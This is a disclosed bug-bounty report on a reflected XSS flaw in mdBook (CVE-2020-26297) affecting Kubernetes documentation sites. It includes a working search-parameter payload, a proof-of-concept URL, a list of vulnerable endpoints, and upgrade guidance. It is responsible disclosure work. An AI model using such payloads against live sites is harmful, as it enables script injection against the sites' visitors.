# XSS on kubernetes-csi.github.io (mdBook)

## Report Details
- **Report ID**: 1073514
- **URL**: https://hackerone.com/reports/1073514
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-07T14:52:00.564Z
- **Disclosed**: 2021-02-04T18:59:05.841Z

## Reporter
- **Username**: vavkamil
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
Hi,

I have recently found XSS vulnerability in mdBook (CVE-2020-26297), fixed and disclosed on 4th January 2020. 
The details were published in a security advisory here: https://blog.rust-lang.org/2021/01/04/mdbook-security-advisory.html

I did a quick recon and found a couple of vulnerable endpoints:
* https://capz.sigs.k8s.io
* https://cluster-api-aws.sigs.k8s.io
* https://cluster-api.sigs.k8s.io
* https://image-builder.sigs.k8s.io
* https://kubernetes-csi.github.io
* https://master.cluster-api.sigs.k8s.io
* https://release-0-2.cluster-api.sigs.k8s.io
* https://secrets-store-csi-driver.sigs.k8s.io

... where the **https://kubernetes-csi.github.io/docs/** is in scope. Update to the latest version and 

I understand if this is not eligible for a bounty, as you didn't have enough time to fix this. On the other hand, I decided to report it anyway, in case you missed it. And because I wasn't able to find any info grading *grace period* for 0days or new CVEs in your policy. 

Kind regards,

Kamil Vavra
@vavkamil

## Steps To Reproduce:
a) Payload used: `x"->xss<img/src/onerror%3Dalert(1)>`
b) PoC: `https://kubernetes-csi.github.io/docs/?search=x"->xss<img/src/onerror%3Dalert(1)>`
  1. Visit [https://kubernetes-csi.github.io/docs/?search=x%22%2D%3Exss%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E](https://kubernetes-csi.github.io/docs/?search=x%22%2D%3Exss%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E)
  2. You should see the XSS executed

## Mitigations:
Owners of websites built with mdBook have to upgrade to mdBook 0.4.5 or greater and rebuild their website contents with it.

## Supporting Material/References:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26297

## Impact

I guess the impact here is minimal, so I submitted it with low severity.

## Attachments
No attachments
